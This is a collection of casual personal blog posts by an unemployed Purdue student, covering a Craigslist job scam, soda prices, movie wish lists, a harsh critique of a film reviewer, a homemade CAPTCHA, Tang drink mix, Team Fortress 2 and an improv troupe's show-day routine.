fields.title: Craigslist porn
fields.text:
I am currently unemployed.

As a result, I've had to resort to some interesting things to pay my cable bill, while I continue looking for a job.

One of those things is selling stuff on ebay.

Another thing I've tried is craigslist. Craigslist is an interesting web site, where you can find all sorts of stuff in your general area. I wandered into the 'web/info desigs' category to see if there was anything I could do. I found a few listings for freelance jobs, a few listings for more permanent positions, and a few random other things. I can't really do anything permanent, since these are all in the Indy area, and I'm living in West Lafayette (70.6 miles, according to Google Maps). I sent emails to the few freelance jobs I saw. Most of those didn't respond.

One entry I found (pictured at right), asks for web designers to work from home creating web graphics. I'm getting pretty desperate at this point, so I decided to inquire. I know it looks pretty suspicious, and asking directly for my PHONE NUMBER (clue number one) is a little creepy, but I was curious. The use of three whole dollar signs was sure enticing (clue number two). I emailed them my INFORMATION including my PHONE NUMBER, and waited for the same null response that I've gotten from pretty much everything else I've tried to make money.

I got the call this morning. My phone rang out with the CTU ringtone (from the show 24) that I think is delightfully ironic and amusing. The 'restricted number' that was calling immediately made me excited. I hoped it was the photography store I applied to yesterday, which I would really love to work at. I was greeted by a sleezy sounding man with a slight accent. 'Show-von McGill?' he asked.

'This is he.' I replied. Another zany name adventure for 'Sho-von' had begun.

'You responed to an entry on Craig's List about Web Designer positions?'

'Yes.' The chances of this being about that photography store are getting worse and worse.

'Okay, well how old are you, Show-von?' Clue number three.

'I'm 21.' I just turned 21 a few weeks ago. I still don't drink.

'Okay, that's no problem, then. You're at Purdue?' Judging from my email address, I suppose.

'Yes, I am.'

Then there was a pause, where I suppose there was some sort of connection problem. He came back saying 'Are you still there?'

'Yes.'

'Are you still there?'

'Yes, I am.' This whole thing is getting a little too weird.

'Are you at Purdue?' I guess he didn't hear me answer the first time.

'Yes, I am.' I replied again.

'Were you afraid to answer?' He asked, apparently he heard nothing after he asked the first time.

'No.' I answered. At this point, I wanted the conversation to end and for him not to have my number anymore. However, I was still curious where this was going. I would soon find out.

'Well, we work with some adult material, would you be comfortable with adult content?' He asked. The cat was out of the bag.

I was not interested in doing porn. I am not yet that desperate. Even if I was, I could make quite a bit more dollar signs than that working independently, I feel. Anyway, my answer was a quick 'No.' Without even saying anything, the dude hung up. I guess nobody in the 'adult' industry is known for being polite, but a simple 'that's not what we're looking for' would have sufficed.

The cat was out of the bag. Curiosity sure killed that cat. Moral: 'multiple dollar signs working with web graphics in the comfort of your own home' means porn.

If anybody knows anybody who needs a website, please hook me up.

fields.title: cost benefit
fields.text:
Soda comes in many shapes and sizes, but which one is right for you? I can't really answer that, because it's all pretty bad for you. However, we can do a cost-benefit analisys of each type of soda container, and decide which is the most bang for your buck. All prices I have listed here were taken from the Speedway convenience store just next door to my apartment building. Can you find better prices? I would prefer to have average prices on this chart, so if you go somewhere that sells soda, please take note of how much all of these items cost and post the data here (along with where you found them). As I add more data to the chart, it will approach 'true average.' When the prices listed here are close to 'true average,' you can see if prices you get are above or below average.

Container SizeNumber 'o' OuncesUnit PricePrice per OZ
Single Can12 OZ$.79$.065833
12 Can box (fridge pack)1444.29.02979167
Two 12 can boxes (special deal)2885.98.02076389
One Liter(re) Bottle33.81402261.29.03814985
Two Liter(re) Bottle67.62804521.59.023511
Single Serving Bottle (2.5 servings)201.39.0695
Two single bottles (5 servings)402.00.05

These results are partially fascinating. It looks like going with the special 12-pack deal is the cheapest (per ounce) way to go when you buy soda. The interesting thing is that it is also the most expensive (per unit) way to go. It is important to note that this chart does not include the loss of value when one of your friends/acquaintances steals some of the cans from your pack. The Speedway did not have any 24-pack boxes. Is a 24-pack a better value?

I think cans taste better than bottles, and that they hold their temperature better. Do you think the type of container changes the value of the drink held within?

I have been buying a lot of 20-ounce bottles lately. I have been saving up the codes printed on the inside of the bottle caps. It is disheartening to know that bottles are the worst value when purchasing soda. I am 38 points, or 10 bottles, away from my goal. Does getting free crap with the packaging increase the value of the drink held within?

A single serving of soda is about 8 ounces (one cup). None of the containers on this list are separated into 8 ounce servings. Why do single-use cans contain 1.5 servings?

By far the best deal (not included on this list) is the fountain drink. Most gas stations and convenience stores sell fountain drinks nowadays. You can buy 32 ounces of soda (including ice) for as little as $.65. That is a value of as little as 2 cents per ounce. You can approach the value of two 12-packs with the convenience of not having anyone steal your soda. If you fill your cup with ice, how much soda are you actually getting? Do gas stations expect you to fill half your fountain drinks with ice? This would make an excellent 'How much is inside' adventure.

The worst deal, it would appear, is the 'Single Serving' bottle. The 20 ounce bottle has been around for a very long time. Is the added plastic flavor worth the extra 4 cents per ounce?

Does anyone even buy 1-liter bottles?

fields.title: Die Hard 4
fields.text:
The following is a list of the top 10 things I want to see in Die Hard 4:

  1. 'Yipee Kay Yay' John McClain needs to say it at some point before the very end of the film. He says it in the trailer, so I know it is in there. I just hope they didn't throw it in at the end. Speaking of endings, Die Hard 4 needs
  2. a better ending than Die Hard with a Vengance. Ten extra minutes of gratuitous and uninteresting action, completely out of place and tedious, just upsets me as a sort-of writer. I'll tell you what does have to be in it at the end, though.
  3. John McClain has to fight a big German dude, who he ends up defeating using chains somehow. Lookout, though, because the German dude isn't actually dead. Also,
  4. McClain shows his technophobia. They've established that John dislikes new technology, and that was just talking about phones on planes. I want to see him really pissed off about all these damn cell phones. The movie seems to be based on computer hackers. There's a lot of good writing potential there that I hope they don't let go to waste.
  5. Bonnie Bodelia as Holly Gennero. IMDB has already crushed this hope. It would be nice to actually see Mrs. John McClain again. Speaking of reprising characters,
  6. Reginald VelJohnson and Samuel L. Jackson both need to reprise their roles somehow, preferably in the same scene and over the phone.
  7. The enemy better be a group of German mercenary terrorists who all use MP5's for some reason. I wouldn't mind a Steyer Aug showing up at some point, though.
  8. John McClain wears a white tank top, which becomes a shade of dark green-gray and splattered with various people's blood by the end of the movie.
  9. Numerous Christmas references, despite the fact that the film is set in mid July. Along those same lines, I'd like to hear
  10. 'Winter Wonderland' playing during the credits. Let's get back to what makes Die Hard great, shall we?

I would be nice to have a really awesome action movie like the good old days, but I just don't see it happening. Die Hard 4 is rated PG-13. That is really disheartening and depressing. You can make your own assumptions, but I doubt we're going to see someone get chopped in half again.

Have fun at the movies this weekend, and stay tuned for my list of the top 10 things I hope to see in Transformers.

fields.title: Is Westhoff the besthoff?  DEAR GOD NO.
fields.text:
As most of you probably guessed, I'm a pretty big fan of giant battling robots. When I judge how cool something is, I judge it on a scale of one to ten. On this scale, one is represented by a bad laser-jet printing of a picture of a skinny man wearing a fanny pack.

Ten is giant battling robots, in space, with lasers.

It should therefore come as little surprise to you that I was somewhat excited about the new Transformers movie. Transformers are the quintessential fulfillment of the absolute coolest thing, beating out Lego, Star Wars, G.I. Joe, and even Battletech. Nothing is cooler to a ten-year-old boy, and I am most certainly a ten-year-old boy at heart.

I certainly lost most of my hard earned respect when I referenced Battletech, so I'll get to the point.

Film critics hate Transformers.

I hate film critics, and by extension, film reviews.

I am therefore not going to write my own review of a movie which I obviously have serious biases for. I will instead write reviews of the reviews.

Let us begin.

Transformers review, by Jeffrey Westhoff
Deny Conformity ReviewScore: 1%

The first review I will be critiquing was written by the questionably literate newspaper writer Jeffrey Westhoff. Westhoff hails from the Northwest Herald, out of Crystal Lake, Illinois. It would seem that the only thing this newspaper will “herald” is the end of any sense of credibility in printed media as we know it. That this puerile and almost vulgar insult to writing is actually distributed to a wide audience is sickening. Westhoff succeeds only at pushing his useless and unintelligent industry further into the deepest, darkest circle of Hell reserved only for him and his kind.

Westhoff begins his asinine rant with the first of many personal attacks on Transformers' director, Michael Bay. Whatever dark, haunting trauma Westhoff endured in his past to cause him to be so ruthlessly opposed to Bay may never be discovered. However, hatred this raw and irrational is certainly unhealthy. Westhoff’s intended punching bag is obvious, with comments like, 'The Transformers, those robots disguised as jets and sports cars, arrive in theaters battling one of the most malevolent forces in the galaxy: Michael Bay. . . 'Transformers' fails because it is a Michael Bay film, terrible for the same reasons all this egomaniacal hack’s films are terrible.' Ouch. Westhoff then goes on to call Bay a 'Jerry Bruckheimer castoff,' and insults Steven Spielberg merely for associating with Bay. Like the film he is so respectfully reviewing, the review itself doesn’t actually start until half-way through.

With the personal attacks off his chest, Westhoff finally gets around to performing the public service he is paid to perform. I guarantee that whatever salary Jeffrey Westhoff earns, even if he works for free, he is paid far too much for what he does. Somewhere, buried in his constant references to Michael Bay’s failures, one might be able to scrape together a few sentences that actually pertain to the film he is theoretically reviewing, but they hardly form much in the way of thoughts. Certainly, the reader instantly gets an understanding of Westhoff’s opinions of the film’s director, but he completely fails to provide many clues to his actual opinion of the film. Certainly the director is not the only one contributing to the process. In fact, many of the complaints Westhoff points directly at Bay, for example the inane subplots thrown into the film to waste our time, could not possibly have been Bay’s fault, as he had nothing to do with the screenplay or the story. Again and again, Westhoff proves that the only thoughts rattling around in that balding empty head of his are about how much he hates Michael Bay. With a perfectly middle-of-the-road 2 out of 4 that he gave the film, he didn’t really seem to hate it quite as much as it sounds. Indeed, the review would hardly be different even if he hadn’t seen the movie, which could quite possibly be the reality.

If all of that was not damning enough evidence to prove that Jeffrey Westhoff is a raving lunatic, there is still the most startlingly disgusting aspect of his review left to discuss. Let us return to the beginning of his review for a moment. Westhoff bellows, 'Whatever chance that 'Transformers,' which is based on the toys that debuted in the 1980s along with a cartoon and a comic book, might have been a decent movie disappeared the moment Bay was hired to direct.' Certainly, his Bay-bashing intentions are clear, but take a moment to read that sentence again.

Jeffrey Westhoff has been writing published film reviews since 1989, yet he is still incapable of forming a proper sentence? Was he so intent on his rage for Michael Bay that he couldn’t stop to edit his own writing? That first, painful sentence stands like the Gates of Hell, warning to 'abandon hope all ye who enter here.' That first, painful sentence screams at you, pleading with you to just stop reading any further. Perhaps you think the review could not possibly go anywhere but up after that. Maybe you continue to read, unable to look away from this horrible car crash you can’t help but watch. Whatever the case, somehow Westhoff is able to sink further and further, and you realize that those gates standing at the entrance to Hell could not possibly have prepared you for the horrors contained within this putrid review.

He ends his review with yet another painful insult. This one is not directed at Bay, however. This insult is pointed directly at the Transformers themselves. Westhoff compares the movie to Go-Bots, the biggest insult to robot-kind that ever was and ever will be. All this came from the man who called Spiderman 3 'an entertaining, coherent and poignant story.'

In a field which itself is a pointless failure, Jeffrey Westhoff is a pointless failure.

Stay tuned for more reviews of reviews on Denyconformity.com!

fields.title: CAPTCHA ON
fields.text:
The time has finally come. Denyconformity.com has finally been given its first active defense against the spammers. Now, all comments will be screened by a simple logic question. Something that computers will hopefully be unable to understand, but which will hopefully be a breeze for any human.

The term CAPTCHA, or 'Completely Automated Public Turing test to tell Computers and Humans Apart' was first coined by Luis von Ahn, Manuel Blum, Nicholas J. Hopper (all of Carnegie Mellon University), and John Langford (of IBM). You can learn more about the CAPTCHA concept on Wikipedia. Most CAPTCHAs involve a scrambled image of some type, depicting certain text. The user has to type that text into a box in order to continue. The problem I see with such a system is that it is simple enough for a computer to decipher. Spammers have the technology to get the text out of an image, even if it is rather thoroughly scrambled, and enter it, violating the CAPTCHA. I am exploring a different approach to the system. My idea is that while computers can easily decipher scrambled images, they still fail to complete even the simplest logic tests. Denyconformity.com will use a system based on that theory.

Now, when you comment on a post, you will have to answer a simple question in order to continue. Instead of just copying text from an image, you will actually be required to think. Hopefully this will screen out anything that I don't want posting comments on the site, like computers or stupid people.

If you have any comments or questions about the system (if, for example, you are unable to answer a CAPTCHA question), feel free to contact me. Send an email to:

smcgill (put an 'at' sign here) denyconformity (put a single period here) com

It turns out that computers can also find email addresses on web sites and add them to spam lists. Spelling out the '@' and the '.' are simple ways to avoid that, apparently.

I thought up many different questions I can ask to prove that you are human. I decided not to use questions that are too complicated, difficult, or stupid. Unused CAPTCHA questions include:

  • In C++, how many bytes are allocated for an 'int' variable type?
  • Plato often spoke of his Theory of Forms. In two thousand words or less, describe your own thoughts on the theory.
  • Suppose a standard 8x8 chessboard has two diagonally opposite corners removed, leaving 62 squares. How can you place 31 dominoes of size 2x1 so as to cover all of these squares?
  • While on my way to St. Ives,I met a man with seven wives.Each wife had seven sacks;Each sack had seven cats;Each cat had seven kits. Kits, cats, sacks, wives; How many were going to St. Ives? (Yes, this is a Die Hard reference)
  • Would you like to go on a date with me? Saying 'no' will verify that you are human.
  • Which of the following would you most prefer? A: a puppy, B: a pretty flower from your sweety, or C: a large properly formatted data file?
  • What year was Khan Noonien Singh born in?
  • Integrate the following equation:

What questions would be good for CAPTCHAs?

fields.title: Tang Update
fields.text:
Tang Update

Tang Update

Tang Update

I went up to the food mart in town, which specializes mostly in foreign groceries, and I found something very interesting.

Read the scoop on Tang, as it stands.

What does this strange package contain? It claims to be Tang, but it is really? This isn't orange, at any rate. The package is very up-front about its MANGGA FLAVOR INSTANT DRINK MIX. The title declares the contents to be 'Kraft Hi-Nutrition Tang,' and it bears a logo very similar to the 'frutrition' logo of the blasphemous American New Tang. However, the ingredients foretell of a glorious non-Splenda future for those who partake in the Hi-nutrition drink.

Ingredients: Sugar, Citric Acid, Sodium Carboxymethylcellulose, Calcium Phosphate, Sodium Chloride, Vitamins, Permitted Artificial Colors (including Tartrazine), Iron Salt, Flavors.

First of all, Sugar at the top of the list is a very good sign. Secondly, 'Sucralose' is nowhere to be found, meaning Splenda is not involved. What the hell is Sodium Carboxymethylcellulose?, I ask myself. Wikipedia lists Sodium Carboxymethylcellulose as an emulsifier, basically the agent which causes the powder to mix with water. New Tang does not list such an agent in its list of ingredients, and I have a theory for this, which I will get to shortly. Moving down the list, Calcum Phosphate prevents 'caking' because nobody wants Tang cake. Sodium Chloride is table salt. Vitamins sounds like when you go to the store and next to the steaks are containers labeled 'meat.' Tartrazine is a yellow dye, which obviously plays the starring role in this drink mix. I have no idea what Iron Salt is. Flavors are apparently the least important ingredient, which I will return to shortly.

DIRECTIONS

By The Glass:
Maglagay ng 1 1/2 tablespoons ng Hi-Nutrition TANG sa isang baso. Lagyan ng malamig na tubig para makagawa ng 200 mL na drink. Stir and serve.

By the pitcher:
Maglagay ng 8 tablespoons ng Hi-Nutrition TANG sa isang pitsel. Lagyan ng malamig na tubig para makagawa ng 1 liter na drink. Stir and serve.

NO NEED TO ADD SUGAR

The entire package is covered with an odd mixture of English and some other language. The back of the package lists the Philippine Importer, which is a possible clue to the product's origins. The front of the package declares the drink to be 'Charged with CALCIUM.' Directly below that, we see that the package 'PANG 4 LITRO.' The side asks, 'Ano bang meron ang Tang? Ang Tang ay siksik sa nutrients na makakatulong sa maraming paraan!' Then we see a list of vitamins, and what they do for you. My favorite is next to Vitamin A, 'Nakatulong sa healthy skin and hair.' Below the vitamin information, is the following:

Available din sa CONCENTRATED Litro Pack. Isang Litro pack lang, isang pitsel na! Siksik sa hi-nutrition benefits and great fruit taste na eksaktosa inyong panlasa. Wata nang tantsa-tantsa. So easy and convenient.

When I opened the top, a poof of the Calcium Phosphate charged powder assailed me directly in the nose. Instantly, my hopes skyrocketed. It really looked and smelled an awful lot like Olde Tang, or at least what my fading memories remember it to be. I scooped some into a spoon to take the above picture. I only spilled a little on the new couch. The powder is a little more yellow than the legends describe Olde Tang to be. The whole thing was rather yellow. It's hard to see in the pictures, but there is a picture of a mango on the package. Yellow mangoes in front of a yellow background was not a great choice. It really smells like Olde Tang.

But how does it taste?

I mixed it together, exactly to the specifications listed in DIRECTIONS. I Maglagayed exactly 1 1/2 tablespoons ng Hi-Nutrition TANG directly sa isang baso. The spoonful and a half of powder was enough to makagawa ng 200 mL na drink, so that's exactly what I, well, makagawad.

I tentatively stirred, and served.

I could immediately tell that this was not Tang. This was not Orange Tang, by any means, but it wasn't even Tang at all. Whatever flavor a drink called Tang might take, it is pretty specific about whether or not the flavor should be tangy. Without that tang, you're just drinking orange Koolaide. Simply put, Hi-Nutrition Tang has no tang. That being said, it's not bad.

As stated before, Hi-Nutrition Tang includes an emulsifier, to help it dissolve with the water. Since other drink products don't contain such emulsifiers, I was curious as to why Hi-Nutrition Tang does. My theory is that, in order to more acurately represent the 'Mangga Flavor,' the creators added an agent that would give the liquid that tropical feel. It's difficult to describe, but there's a certain thickness to Hi-Nutrition Tang. The flavor is very subdued (last on the list of ingredients, even), and it almost has more of the texture of real juice to Tang. Juice texture works out fine for juice, but I just don't know if it works out for the H-NT. It really does taste like I figure 'Mangga' tastes like, but the general lack of 'tang' left me unsatisfied. I feel like every other sip is delicious, which is an odd sensation. In the end, H-NT is just not delicious enough to make the $2.79 price tag for only Panging 4 Litros.

I have one last observation to say about the Hi-Nutrition Tang. The package containing the powder is one of the worst things ever. There is no way to properly position the package that won't lead to powder somehow falling out of it all over my desk. As I type this, I'm trying to think of a way to clean this bit of Tang powder from my desk without getting it inside my keyboard and computer. The bottom of the package is not made to stand upon, so it's impossible to just stand the the thing up without it falling and shooting a large cloud of powder all over whatever poor victim happens to be in that direction. It pangs ng large mess.

Unfortunatly, it would seem that the quest for the True Tang will continue another day. It was refreshing to have some Tang without Splenda for a change, but Hi-Nutrition Tang was ultimately unsuccessful at filling that void in my soul. It looks like the Kraft Boycott is still on.

fields.title: Social Experiment
fields.text:
I had this idea today:

I was standing in Discount Den, a local convenience store, waiting in line to pay for the large cup of Dr. Pepper that was about to be my fix for the day. The infectious, ear-splitting Aphex Twin acid was pumping directly into my brain, loud enough for most of the inhabitants of the store to hear. I often hope that someone will recognize the endless, insanely complex drum loops AFX does so well, and strike up a conversation. No dice today, I'm afraid.

It was hard for me to not notice that the girl standing in front of me in line is one of the most gorgeous women on the face of the planet. That is an important addition to the story simply because she served as the catalyst for my idea, not necessarily because I think beautiful women should be treated differently. It is simply a vastly interesting aspect of this universe that extremely gorgeous women happen to catalyze the highest levels of creativity. Perhaps this reaction in my brain was catalyzed in such a fashion, perhaps not, but nevertheless, as a matter of literary description, the person standing in front of me was breathtaking. I don't even remember anything specific about her. She just had the general air of someone who is interesting and truly beautiful in every way that counts. She was getting a tube of chap-stick when I entered the line behind her. The pure efficiency of her 'enter the line, then get the things you need' game plan was what probably attracted me to her in the first place.

She had one earbud in her left ear. Her head was turned toward the chap-stick, minor pain killer, and contraceptive section, which placed her right ear - the one without a headphone - toward me. I was praying to every possible god that she would recognize the Aphex Twin I was listening to and further prove herself to be the most attractive woman alive.

She didn't.

If I was anybody else on the planet I would have been able to talk to her. I would have said 'nice day for chapstick,' or 'nice weather we're having,' or even 'you're the most beautiful woman I've ever seen.'

I didn't.

Instead, we both did what everyone else in the store was doing. We filed on, quietly and patiently awaiting our turn at the registers, trying to ignore the guy standing behind me talking on his cellular phone at an obnoxious volume. 'Oh, they're having sex tonight?' he cooed.

If I was anybody else on the planet I would have told the guy off, thereby impressing the gorgeous girl in front of me, and saving the world once again from the perils of people who don't know how to behave in public situations.

I didn't do that, either.

Instead, I waited patiently for my turn. Finally the girl in front of me and I both made it to the registers. This particular establishment has two such systems, allowing twice the flow of a similar, but less equipped store. It just happened that the two registers, and the two partially-punk clerks standing behind them became available at the same time. The gorgeous girl and I quietly (except for the AFX) went up to the plate. I had my giant cup of Dr. Pepper, and she had her extremely efficient chapstick. She quickly asked her clerk to give her a particular pack of clove-cigarettes, another trait that did nothing but add allure to her already divine appearance. It was around this point that I came up with my idea.

What I thought was nothing new, but as a foolish young man with an impossible insta-crush on a gorgeous girl I'd never met, I thought I was a genius. The partially-punk clerk standing at register number one asked me if the drink I was carrying was all I had. I paused for a few insanely complex drum loops, and responded with the affirmative.

If I only had a few more moments, a few more insanely complex drum loops to compose myself, I would not have nodded at my partially-punk clerk. 'Why, no it isn't,' I would have said, 'I'm also paying for her.' I would have made a quick nod to the gorgeous girl, who was waiting for her partially-punk clerk to get her the particular brand of clove-cigarettes she asked for. I would have added the gorgeous girl's items to my charge, and I would have paid for them with a smile. 'Don't even worry about it,' I would have told her, 'I just want to do a nice thing for a pretty girl.' I would have been on my way, feeling like the nice kind of guy, the self-less kind of guy, and also the outrageously nervous, heart's-about-to-explode kind of guy. I would have maybe introduced myself, and then I might have had a name to put with the gorgeous girl, instead of just 'gorgeous girl.' I might have done all of those things. I wouldn't even have needed to be anybody else on the planet to do all of those things. I had all that inside me, and I was completely determined and ready to do it.

But I didn't.

I panicked, gave the nod to my clerk, paid extremely fast, and got out of the place as fast as I could. I almost turned around and went right back in, ready to say 'actually, I'm going to pay for hers, too.' But I still didn't. You could, quite accurately, say that I unarguably and unequivocally manned down.

However, the experience was not a total loss. I thought about the idea as I was hiding somewhere afterwards, and I definitely think it could be a very good one. Not to pick up women, although that would certainly be a nice bonus, but just to add a bit of kindness to an otherwise cruel and 'boner-killing' world. Imagine a world where people do that sort of thing all the time. Wouldn't you be more excited about going out and socializing if things like that happened all the time? Why would we hide behind our earbuds and our Aphex Twin if we knew the world wasn't so cruel after all?

My friends, I invite you to get out there and do something nice for someone. It could be the gorgeous girl you see at Discount Den, or it could be an elderly woman who is having trouble carrying her groceries. Open a door for someone who has their hands full. Tell someone they look nice today. Bring the person who has been outside handing out fliers all day a bottle of water. Talk on your cellphone more quietly, or even consider turning it off sometimes. Humor someone, tell a stranger a joke, or just smile every once in a while. Do it enough, get other people doing it, and eventually it won't be a task anymore. Eventually, it will just be one huge friendly society. It may be a stupid idea, and I'll probably just get my boner killed in a very short amount of time, but it could also work. It won't kill us.

We could, dare I say it, change the world! Haven't you wanted to change the world?

If anybody has any thoughts, comments, or experiences with this idea, that's what the comments box down below is for. Just please try not to kill my boner too hard. Also, I'm sorry for using such a vulgar term like 'boner-killer.' It's just a term I use to describe something that is an extreme emotional let-down, except that it flows off the tongue easier than 'extreme emotional let-down.'

fields.title: Vista Tip 1
fields.text:
Here's my Windows Vista tip of the day.

Open Windows Explorer. That's [Windows Key]+[E] if you were unaware. Now look on the left-hand side of the window. See 'Favorite Links' there? Have you ever wanted to change those links?

You can. It's really simple. Windows XP users might not even attept to change them, because XP forced users to stick with whatever folders were there by default. Sure you could change them, but it involved complicated forays into the registry, which is something most people are not comfortable with. However, Windows Vista allows you to put whatever you want into your Favorite Links. Here's how.

There's two ways to do it. One is easy, and the other is really easy. First, navigate to your User Folder. That should be right under 'Desktop' under 'Folders' on the left side of Windows Explorer. Next, go into your Links folder. There they are, the shortcuts that appear in the Favorite Links panel. Open a second Explorer window, and navigate to whatever location you want. Click the right mouse button on whatever folder you want to send to the Links, and while holding the right mouse button down, drag it to the Links folder. Release the right mouse button and click 'Place Shortcut Here.' You've done it. The easier way is to just drag folders or other shortcuts directly to the Favorite Links panel in Windows Explorer. Give it a try, it's fun and it increases productivity surprisingly well. I have a link to Downloads, Videos, Documents, and Program Files (x86) in mine. Unfortunately, you can only put shortcuts to folders there, so you can't add your most common programs to the list. You can resize the Favorite Links panel, though, to accommodate additional shortcuts.

That does it for today. Keep using that Vista, and you'll be doing things you never even dreamed of in no time, such as actually liking Windows Vista.

fields.title: Team Fortress
fields.text:
Valve software (the creators of the Half Life computer games) is going to release a new collection of games on October 9th. They have these three games, each extremely interesting, and they decided (brilliantly) to release them all at once, in the same package. It's called The Orange Box, and it's one of the most highly anticipated games of the year (move over, Halo 3). The three games are Half Life 2: Episode 2, Portal, and Team Fortress 2. The new chapter of Half Life is a really big deal, because it has all the excitement and emotional attachment of Lost, Heroes, and Grey's Anatomy. Seriously, this one is a big deal. Portal is a very intriguing pseudo-puzzle game, which you really have to see to properly understand. You can Google it if you wish. Finally, Team Fortress 2 is a multiplayer game with such unique art design and production qualities that it really stands above all other multiplayer games. I'm not a huge fan of the online experience, but I've been playing Team Fortress 2 more in the last week or so than any other game I've had in quite a while. Valve decided to release a 'beta' version of Team Fortress 2 ahead of the other two games in the package, just to give the thousands of people who bought the game already something to do. I am one of those people.

So here is my list of ten things I like about Team Fortress 2.

  1. The game is extremely easy for beginners to pick up. The game has nine different classes (which changes your appearance, skills, and weapons), and they each have their own pros and cons. Each class supports a different play style, so if you aren't comfortable with running around and shooting people, you don't necessarily have to. This allows new players to warm up to the more complex game mechanics by starting off with some of the easier classes.
  2. The game is instantly recognizable. Nobody can look at a screenshot of Team Fortress 2, and confuse it with a different game. Just look at some pictures of it on Google, and you'll see what I mean. It's gorgeous.
  3. The game is simple, but not too simple. It is very easy to know exactly what you need to do and what the general situation is, but it's not boring. There's plenty to think about without being overwhelmed.
  4. The game is meticulously designed. Absolutely every aspect of the design is painstakingly thought out, to ensure that nothing detracts from the experience. Valve playtests all of their games thoroughly, so that they see exactly how players react to specific aspects. This means that every single rock, piece of wood, building, and map is in the most perfect location to ensure balanced and fair play. The game only has a handful of maps, because they are so meticulously poured over.
  5. The game hardly gets old. Sure, the novelty of the amazing graphics wears off a little bit, but the game itself does not get boring as you get used to it. If you're sick of a certain class, or you just can't seem to get anything done, you have eight other classes to choose from. Simply switch classes, and it's like you're playing an entirely different game.
  6. The game has commentary. Just like a DVD, you can load up a special version of a few levels and listen to the developers talk about the game and the processes involved with designing it. This is an extraordinary addition, which allows you to see just how much thought went into it.
  7. The game is on Steam. There has been much argument over whether Steam is good or bad. However, having the ability to instantly join your friends in a game (even when you're not in the game at all), and the automatic updating system is a very good thing.
  8. The game is fun. Even when everything is working, and 24 players are all shooting rockets at each other, and you're losing, and you can't seem to get anything accomplished, the game is still pretty fun. Sure it's challenging, and it makes you think, but it is also fun, which is important.
  9. The game promotes camaraderie. I can easily recognize other guys on my team, and after a while I can really develop a bond with them. I really enjoy helping guys who have helped me out, and it is very motivating to know exactly who keeps scoring kills against me. This is the strength of an online game, because all of the other players are human.
  10. The game has incredible detail. I've played it for 20+ hours over the last week and a half, and I'm still finding new things in the levels and characters. All of the different classes yell out taunts and other phrases, and it's a really great feeling to do something really awesome and hear your character yelling out his approval. Each level has hundreds of little secret nooks and crannies, which will take years to fully explore (especially while people are shooting at you).

fields.title: The Crazy Monkey video process.
fields.text:
I know that many of you are excited to see the video from Crazy Monkey shows on their website. Get ready to be surprised. Are you ready? I'm the person who puts that video online! Isn't that surprising?? I knew it would be.

Anyway, as a treat to purveyors of the Crazy Monkey website, I thought I'd let you all in on the routine that I go through to get ready for, perform in, and produce video of every Crazy Monkey show! Now you will all know my high-tech, patent pending secrets. Prepare your mind to be BLOWN. At the very least, I'm making all of this up, so hopefully it will be partially amusing to you.

See the routine here!

As a treat to purveyors of the Crazy Monkey website, I thought I'd let you all in on the routine that I go through to get ready for, perform in, and produce video of every Crazy Monkey show! Now you will all know my high-tech, patent pending secrets. Prepare your mind to be BLOWN. At the very least, I'm making all of this up, so hopefully it will be partially amusing to you.

Here is the breakdown, in order of operation. Use this list of procedures in your own life to get the most out of whatever, blah, blah, etc.

FURTHER ADO.

  • Get up the morning afternoon of the Crazy Monkey show and eat a grilled cheese sandwich, made in Andrew Monkey's sandwich maker.
  • Pat Sherman.
  • Remember that you have to turn in a paper today in one of your classes; decide not to skip it after all.
  • Throw on some clothes, grab jacket, put an Aphex Twin track on MP3 player, and hop on bike.
  • If you almost get hit by less than three cars on your way to campus, you're having a boring day.
  • Get to class and turn in paper.
  • Get home, open Adobe Dreamweaver.
  • Spend three hours writing a javascript function that loads up a secret page talking about -I don't know- lungfish, or something, on the Crazy Monkey website.
  • Make a grilled cheese sandwich for lunch. Get 32oz. Dr. Pepper from the Discount Den ($.55).
  • Return home, and Greet John Monkey, who has just woken up on couch. He is still hanging out at the apartment, where he has been since Crazy Monkey Practice on Tuesday. Help him find his pants.
  • Pat Sherman.
  • Suddenly remember that you have to pick up the camera and tripod that you had on reserve in the lab. Finish grilled cheese sandwich (lunch), queue up more Aphex Twin, and hop back on bike.
  • Almost get hit by three more cars (give or take a few).
  • Get the camera and tripod. Sign the check-out contract as 'Harland W. Fankboner, esq.' Inquire about steam locomotives.
  • Strap Backpack, Photography Camera Bag, Video Camera Bag, and Tripod Bag to self, being careful to balance them for maximum balance on bike.
  • Ride home, with traffic, despite being weighted down by tens of pounds of equipment, gear and video game magazines.
  • Get home, greet Andrew Monkey, who has started playing Team Fortress 2.
  • Start playing Team Fortress 2.
  • Load a server playing either ctf_2fort or cp_hydro. Play as Scout for a while, but get fed up with dying so much and switch to heavy.
  • Complain about always having to play Heavy, because nobody else ever plays Heavy.
  • Keep track of dudes in your basement.
  • Get bored with Team Fortress, and quit.
  • Pat Sherman.
  • Load up this week's episode of My Name is Earl and watch it, hoping that Andrew and John Monkeys will validate your existence by finding the show you like funny.
  • Cook two more grilled cheese sandwiches. Eat them. Buy can of Dr. Pepper from pop machine outside.
  • Realize that show starts in an hour, decide it's time to start getting ready to go.
  • Put on lucky pants, lucky shirt that your mom made for you, lucky suspenders, and have Andrew Monkey tie bow tie for you.
  • Grab camera, video camera, extra tapes, primary tapes, email list clipboards, monkey binder, briefcase, extra grilled cheese sandwich, can of Dr. Pepper, shoes, hat, wrist bands that make you look really sweet, phone, MP3 player, and John. Pile into Andrew Monkey's car.
  • Drive two blocks, remember that you forgot tripod.
  • Drive back, get tripod.
  • Pat Sherman
  • Drive three blocks to campus, park in parking garage.
  • Grab all things, go to Matthew's Hall.
  • Set up camera, discuss and plan setlist for the show.
  • Watch newbies set up banner. Say, 'Look at banner, Michael!' to Mike Monkey.
  • Argue that since parents are going to be there, you should be considered for the best stuff. Actually, you're just trying to impress pretty girl who said she was coming to show.
  • Check self in mirror, making sure you look extra-awesome for pretty girl.
  • Warm up for show, pretending to do yoga or something so you look like you're serious about craft.
  • Group warmup time. Get in a circle with others, say only prime numbers when trying to count to 20 as a group.
  • In bibbity-bibbity-bop, call Stonehenge on everyone at once. That's always good for a laugh.
  • Do show, trying to look extra awesome and hilarious for pretty girl. Actually, look ridiculous and dankly. Begin to wish you had actually warmed up.
  • Say really funny thing, without realizing it, and make it look like you meant to do that.
  • Play Evil Twin (as the evil twin), try not to threaten to rape anyone, but accidentally threaten it anyway, since you can't think of anything more evil to do.
  • End show.
  • Stand at front doors of Matthew's hall, thanking everyone for coming out. Search through crowd for pretty girl.
  • Suddenly realize that pretty girl has come up to you to congratulate you. Freeze up, and don't think of anything good to say, even though you're an improv comedian.
